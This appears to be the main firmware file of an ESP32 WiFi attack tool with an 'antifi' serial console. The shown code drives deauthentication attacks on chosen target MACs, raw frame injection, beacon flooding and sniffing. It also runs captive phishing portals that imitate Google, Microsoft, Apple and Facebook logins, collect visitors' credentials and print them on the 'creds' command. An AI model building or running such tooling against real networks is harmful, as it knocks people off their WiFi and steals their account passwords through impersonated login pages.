#include <cstdio>
#include <cstdlib>
#include <vector>

#include "scan.h"
#include "sniff.h"
#include "inject.h"
#include "beacon.h"
#include "deauth.h"
#include "captive_portal.h"
#include "configs.h"

#include "esp_wifi.h"
#include "esp_netif.h"
#include "driver/adc.h"

void stopWifi() {
  // Just stop activity, DO NOT deinit the driver here
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();

  // Do NOT call esp_wifi_deinit() here
  // Do NOT destroy netifs here

  adc_power_off();
}

void stopAll() {
  scan_setup("stop");
  sniffer.stop();

  stop_deauth();
  stop_beacon();
  injectorManager.stopAllInjectors();
  portalManager.stopPortal();

  stopWifi();

  delay(1000);

  Serial.println("Everything stopped");
}

// ===== Command Handlers =====
void handleDeauthCommand(String cmd) {
  char srcMac[18] = { 0 }, tgtMac[18] = { 0 };
  int channel = 1;
  int pps = 25;

  int parsed = sscanf(cmd.c_str(), "deauth -s %17s -t %17s -c %d -p %d", srcMac, tgtMac, &channel, &pps);

  if (parsed == 4) {
    if (channel < 1 || channel > 13) {
      Serial.println(F("Error: Channel must be between 1 and 13"));
      return;
    }
    deauth_setup(srcMac, tgtMac, channel, pps);
    Serial.println(F("Deauth started."));
  } else {
    Serial.println(F("Error: Invalid deauth command format"));
    Serial.println(F("Usage: deauth -s <source_mac> -t <target_mac> -c <channel> -p <packets_per_second>"));
  }
}

bool parseInjectCommand(String command, String& injectorName, uint8_t* packetData, uint16_t& packetLen, uint8_t& channel, uint32_t& pps, uint32_t& maxPackets) {
  // Find the space after the injector name
  int spaceIndex = command.indexOf(' ');
  if (spaceIndex == -1) {
    Serial.println("Error: Invalid command format");
    Serial.println("Usage: inject -i <frame info> -ch <channel> -pps <packets per second> -m <maximum send packets & \"non\" for no limit>");
    return false;
  }

  injectorName = command.substring(0, spaceIndex);

  // Verify it's a valid injector name (inject followed by a number)
  if (!injectorName.startsWith("inject")) {
    Serial.println("Error: Injector name must start with 'inject'");
    return false;
  }

  // Check if there's a number after "inject"
  String numberPart = injectorName.substring(6);
  if (numberPart.length() == 0) {
    Serial.println("Error: Injector name must be 'inject' followed by a number");
    return false;
  }

  for (char c : numberPart) {
    if (!isdigit(c)) {
      Serial.println("Error: Injector name must be 'inject' followed by a number");
      return false;
    }
  }

  // Now parse the rest of the command
  String restOfCommand = command.substring(spaceIndex + 1);

  // Check for required parameters
  if (!restOfCommand.startsWith("-i ")) {
    Serial.println("Error: Command must start with '-i' after injector name");
    Serial.println("Usage: " + injectorName + " -i <frame info> -ch <channel> -pps <packets per second> -m <maximum send packets & \"non\" for no limit>");
    return false;
  }

  // Find parameter indices
  int iIndex = 0;  // -i is at position 0 in restOfCommand
  int chIndex = restOfCommand.indexOf("-ch ");
  int ppsIndex = restOfCommand.indexOf("-pps ");
  int mIndex = restOfCommand.indexOf("-m ");

  if (chIndex == -1 || ppsIndex == -1 || mIndex == -1) {
    Serial.println("Error: Missing required parameters (-ch, -pps, or -m)");
    Serial.println("Usage: " + injectorName + " -i <frame info> -ch <channel> -pps <packets per second> -m <maximum send packets & \"non\" for no limit>");
    return false;
  }

  // Extract packet data (hex string between -i and -ch)
  String packetDataStr = restOfCommand.substring(3, chIndex);
  packetDataStr.trim();

  // Extract channel
  String channelStr = restOfCommand.substring(chIndex + 4, ppsIndex);
  channelStr.trim();
  channel = channelStr.toInt();

  // Extract packets per second
  String ppsStr = restOfCommand.substring(ppsIndex + 5, mIndex);
  ppsStr.trim();
  pps = ppsStr.toInt();

  // Extract max packets
  String maxStr = restOfCommand.substring(mIndex + 3);
  maxStr.trim();
  maxPackets = 0;  // 0 means no limit
  if (maxStr != "non") {
    maxPackets = maxStr.toInt();
  }

  // Validate parameters
  if (channel < 1 || channel > 13) {
    Serial.println("Error: Channel must be between 1 and 13");
    return false;
  }

  if (pps == 0) {
    Serial.println("Error: Packets per second must be greater than 0");
    return false;
  }

  if (pps > 2000) {
    Serial.println("Error: Packet rate > 2000");
    return false;
  }

  // Convert hex string to bytes
  hexStringToBytes(packetDataStr, packetData, &packetLen);

  if (packetLen == 0) {
    Serial.println("Error: Invalid packet data format");
    Serial.println("Make sure hex bytes are space-separated and valid");
    return false;
  }

  if (packetLen > 512) {
    Serial.println("Error: Packet too large (max 512 bytes)");
    return false;
  }

  return true;
}

void parseArguments(String command) {
  // Reset config
  config = { "Captive Portal", "", "", "wifi", "open", false };

  command.trim();

  // --- Tokenize while respecting double quotes ---
  std::vector<String> tokens;
  String cur = "";
  bool inQuotes = false;

  for (size_t i = 0; i < command.length(); ++i) {
    char c = command.charAt(i);
    if (c == '"') {
      // toggle inQuotes, do not include the quote char in token
      inQuotes = !inQuotes;
      continue;
    }
    if (c == ' ' && !inQuotes) {
      if (cur.length() > 0) {
        tokens.push_back(cur);
        cur = "";
      }
    } else {
      cur += c;
    }
  }
  if (cur.length() > 0) tokens.push_back(cur);

  // If first token is the command name (e.g., "captive_portal"), skip it
  int startIndex = 0;
  if (tokens.size() > 0) {
    String first = tokens[0];
    if (first.equalsIgnoreCase("captive_portal")) startIndex = 1;
  }

  // Parse arguments from tokens vector
  for (int i = startIndex; i < (int)tokens.size(); ++i) {
    String a = tokens[i];
    if (a == "-s" && i + 1 < (int)tokens.size()) {
      config.ssid = tokens[++i];        // preserves spaces & case (quotes removed)
    } else if (a == "-m" && i + 1 < (int)tokens.size()) {
      config.mac = tokens[++i];
    } else if (a == "-p" && i + 1 < (int)tokens.size()) {
      config.password = tokens[++i];
    } else if (a == "-t" && i + 1 < (int)tokens.size()) {
      config.portalType = tokens[++i];
    } else if (a == "-e" && i + 1 < (int)tokens.size()) {
      config.encryption = tokens[++i];
    } else if (a == "-v") {
      config.verbose = true;
    } else {
      // Unknown token — ignore or log if you wish
    }
  }
}

bool setMacAddress(String macStr) {
  if (macStr.length() != 17) {
    Serial.println("Error: MAC address must be 17 characters (XX:XX:XX:XX:XX:XX)");
    return false;
  }

  uint8_t mac[6];
  int values[6];
  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
             &values[0], &values[1], &values[2],
             &values[3], &values[4], &values[5])
      == 6) {
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)values[i];

    esp_err_t err = esp_wifi_set_mac(WIFI_IF_AP, mac);
    bool success = (err == ESP_OK);

    if (config.verbose) {
      if (success) {
        Serial.print("MAC address configured: ");
        Serial.println(macStr);
        uint8_t actual[6];
        esp_wifi_get_mac(WIFI_IF_AP, actual);
        char actualMacStr[18];
        snprintf(actualMacStr, sizeof(actualMacStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 actual[0], actual[1], actual[2],
                 actual[3], actual[4], actual[5]);
        Serial.print("Actual AP MAC: ");
        Serial.println(actualMacStr);
      } else {
        Serial.println("Warning: Could not set MAC (esp_wifi_set_mac failed)");
      }
    }
    return success;
  }

  Serial.println("Error: Invalid MAC address format.");
  return false;
}

void handleStartCommand(String command) {
  parseArguments(command);

  // Validate portal type
  String validTypes[] = { "google", "microsoft", "apple", "facebook", "wifi" };
  bool validType = false;
  for (auto& type : validTypes) {
    if (config.portalType == type) {
      validType = true;
      break;
    }
  }

  if (!validType) {
    Serial.println("Error: Invalid portal type. Must be: google, microsoft, apple, facebook, wifi");
    return;
  }

  // Validate encryption
  String validEncryption[] = { "open", "wpa", "wpa2", "wpa3" };
  bool validEnc = false;
  for (auto& enc : validEncryption) {
    if (config.encryption == enc) {
      validEnc = true;
      break;
    }
  }

  if (!validEnc) {
    Serial.println("Error: Invalid encryption. Must be: open, wpa, wpa2, wpa3");
    return;
  }

  // Validate password length if encryption is not open
  if (config.encryption != "open" && config.password.length() < 8) {
    Serial.println("Error: Password must be at least 8 characters for WPA/WPA2/WPA3 encryption");
    return;
  }

  // Set MAC address if provided
  if (config.mac.length() > 0) {
    setMacAddress(config.mac);
  }

  // Print configuration
  if (config.verbose) {
    Serial.println("\n=== Portal Configuration ===");
    Serial.print("SSID:        ");
    Serial.println(config.ssid);
    Serial.print("Portal Type: ");
    Serial.println(config.portalType);
    Serial.print("Encryption:  ");
    Serial.println(config.encryption);
    if (config.mac.length() > 0) {
      Serial.print("MAC:         ");
      Serial.println(config.mac);
    }
    if (config.password.length() > 0) {
      Serial.print("Password:    ");
      Serial.println(config.password);
    }
    Serial.println("==============================\n");
  }

  // Stop any running portal
  if (portalManager.isRunning()) {
    Serial.println("Stopping existing portal...");
    portalManager.stopPortal();
    delay(1000);
  }

  // Start the portal
  Serial.println("Starting portal...");
  bool success = portalManager.startPortal(config.ssid, config.password, config.portalType);

  if (success) {
    Serial.println("Portal started");
    Serial.print("  Access via: ");
    Serial.println(portalManager.getAPIP());
    Serial.print("  MAC: ");
    Serial.println(portalManager.getAPMAC());
  } else {
    Serial.println("Failed to start portal!");
  }
}

void processCommand(String cmd) {
  cmd.trim();

  if (cmd.length() == 0) {
    Serial.print(F("antifi> "));
    return;
  }

  String lowerCmd = cmd;
  lowerCmd.toLowerCase();

  Serial.println();

  bool showPrompt = true;

  // ====== HELP ======
  if (lowerCmd == "help" || lowerCmd == "?") {
    showHelp();
  }
  // ====== VERSION ======
  else if (lowerCmd == "version" || lowerCmd == "v") {
    Serial.println(version);
  }
  // ====== SNIFF ======
  else if (cmd.startsWith("sniff")) {
    int cpos = cmd.indexOf("-c");
    if (cpos < 0) {
      Serial.println("ERROR: missing -c");
      return;
    }

    String arg = cmd.substring(cpos + 2);
    arg.trim();

    Serial.println("Sniffing started");
    delay(1000);

    if (arg.equalsIgnoreCase("all")) {
      sniffer.start(0);
    } else {
      int ch = arg.toInt();
      sniffer.start((uint8_t)ch);
    }

    showPrompt = false;
  }
  // ====== SCAN ======
  else if (lowerCmd.startsWith("scan -t ")) {
    String scanType = lowerCmd.substring(8);
    if (scanType == "ap" || scanType == "sta") {
      scan_setup(scanType.c_str());
      showPrompt = false;
    }
  }
  // ====== INJECT ======
  else if (lowerCmd.startsWith("inject")) {
    // Initialize WiFi
    WiFi.mode(WIFI_STA);

    // Initialize promiscuous mode
    esp_wifi_set_promiscuous(true);

    String injectorName;
    uint8_t packetData[512];
    uint16_t packetLen = 0;
    uint8_t channel = 1;
    uint32_t pps = 0;
    uint32_t maxPackets = 0;

    if (parseInjectCommand(cmd, injectorName, packetData, packetLen, channel, pps, maxPackets)) {
      // Display packet info before starting
      Serial.println("\n=== Configuring Injector ===");
      Serial.println("Name: " + injectorName);
      Serial.println("Packet length: " + String(packetLen) + " bytes");
      Serial.println("Channel: " + String(channel));
      Serial.println("Rate: " + String(pps) + " packets/sec");
      Serial.println("Max packets: " + (maxPackets == 0 ? "Unlimited" : String(maxPackets)));

      injectorManager.startInjector(injectorName, packetData, packetLen, channel, pps, maxPackets);
      Serial.println("Injector " + injectorName + " started successfully");
      Serial.println("===========================\n");
    }
  }
  // ====== LIST INJECTORS ======
  else if (lowerCmd == "list_injectors") {
    injectorManager.listInjectors();
  }
  // ====== DEAUTH ======
  else if (lowerCmd.startsWith("deauth")) {
    handleDeauthCommand(lowerCmd);
  }
  // ====== BEACON ======
  else if (lowerCmd == "beacon -s") {
    beacon_setup();
    showPrompt = false;
  }
  // ====== STOP ALL ======
  else if (lowerCmd == "stop") {
    stopAll();
  }
  // ====== STOP INJECTOR ======
  else if (lowerCmd.startsWith("stop -p ")) {
    String injectorName = cmd.substring(8);
    if (injectorName == "all") {
      injectorManager.stopAllInjectors();
    } else {
      injectorManager.stopInjector(injectorName);
    }
  }
  // ====== CREDS ======
  else if (lowerCmd == "creds") {
    portalManager.printCredentials();
  }
  // ====== CLEAR ======
  else if (lowerCmd == "clear") {
    portalManager.clearCredentials();
    injectorManager.clearAllInjectors();
  }
  // ====== CAPTIVE PORTAL ======
  else if (lowerCmd.startsWith("captive_portal")) {
    handleStartCommand(lowerCmd);
    showPrompt = false;
  }
  // ====== UNKNOWN COMMAND ======
  else {
    Serial.println(F("Error: Unknown command. Type 'help' for available commands."));
  }

  if (showPrompt) {
    Serial.print(F("antifi> "));
  }
}

// ===== Serial Input Handler =====
void handleSerialInput() {
  while (Serial.available()) {
    char c = Serial.read();

    if (c == '\n' || c == '\r') {
      if (inputBuffer.length() > 0) {
        processCommand(inputBuffer);
        inputBuffer = "";
        inputBuffer.reserve(64);
      }
    } else if (c == 8 || c == 127) {  // backspace
      if (inputBuffer.length() > 0) {
        inputBuffer.remove(inputBuffer.length() - 1);
        Serial.print("\b \b");
      }
    } else if (c >= 32 && c <= 126) {  // printable characters
      inputBuffer += c;
    }
  }
}

void updatePortalStatus() {
  static unsigned long lastStatusUpdate = 0;

  if (millis() - lastStatusUpdate > 10000) {  // Every 10 seconds
    lastStatusUpdate = millis();

    if (portalManager.isRunning()) {
      Serial.print("[Status] ");
      Serial.print("SSID: ");
      Serial.print(portalManager.getSSID());
      Serial.print(" | Type: ");
      Serial.print(portalManager.getPortalType());
      Serial.print(" | Clients: ");
      Serial.print(portalManager.getClientCount());
      Serial.print(" | Captured: ");
      Serial.println(portalManager.getCredentialsCaptured());
    }
  }
}

void hexStringToBytes(String hexStr, uint8_t* bytes, uint16_t* len) {
  hexStr.replace(" ", "");
  hexStr.trim();

  // validate characters
  for (size_t i = 0; i < hexStr.length(); ++i) {
    char c = hexStr.charAt(i);
    if (!isxdigit(c)) {
      *len = 0;
      return;
    }
  }

  if (hexStr.length() % 2 != 0) {
    *len = 0;
    return;
  }

  *len = hexStr.length() / 2;
  for (uint16_t i = 0; i < *len; i++) {
    String b = hexStr.substring(i * 2, i * 2 + 2);
    bytes[i] = (uint8_t)strtol(b.c_str(), NULL, 16);
  }
}

// ===== Setup & Loop =====
void setup() {
  Serial.begin(SERIAL_BAUD);
  delay(1000);
  pinMode(led, OUTPUT);
  for (int i = 0; i < 3; i++) {
    digitalWrite(led, HIGH);
    delay(200);
    digitalWrite(led, LOW);
    delay(200);
  }
  inputBuffer.reserve(64);
  setScanDuration(6000000);
  showBanner();
  Serial.print(F("antifi> "));  // Initial prompt
}

void loop() {
  handleSerialInput();
  portalManager.update();
  updatePortalStatus();
  injectorManager.updateInjectors(currentChannel);
  sniffer.update();
  beacon_loop();
  deauth_loop();
  scan_loop();
}